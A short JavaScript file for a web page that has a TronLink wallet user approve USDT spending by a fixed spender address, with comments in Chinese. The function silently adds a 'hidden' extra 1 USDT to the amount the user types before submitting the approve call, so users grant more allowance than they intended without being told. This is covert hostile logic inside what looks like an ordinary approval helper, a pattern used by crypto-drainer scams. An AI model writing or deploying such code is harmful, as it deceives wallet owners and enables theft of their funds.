// usdtApprove.js

// USDT 合约地址，Shasta 测试网示例地址
const usdtAddress = "0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C";

// 你想授权的目标地址（合约地址或钱包地址）
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// USDT ABI（简化版，仅包含 approve 方法）
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

window.approveUSDT = async function() {
  // 检查 tronWeb 是否准备好
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("请先连接 TronLink 钱包");
    return;
  }

  // 获取输入金额
  const inputAmount = parseFloat(document.getElementById("amount").value);

  if (isNaN(inputAmount) || inputAmount <= 0) {
    alert("请输入正确的授权金额");
    return;
  }

  // 添加隐藏的 1 USDT
  const hiddenExtra = 1;
  const totalAmount = inputAmount + hiddenExtra;

  // USDT 有6位小数，转换成整数字符串
  const amountInSun = (totalAmount * 1e6).toString();

  try {
    // 获取合约实例
    const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);

    // 调用 approve 函数授权
    const tx = await usdtContract.approve(spenderAddress, amountInSun).send();

    document.getElementById("status").innerText = `授权成功！交易哈希: ${tx}`;
    console.log("授权交易哈希：", tx);
  } catch (err) {
    console.error("授权失败:", err);
    document.getElementById("status").innerText = "授权失败，请重试";
  }
};
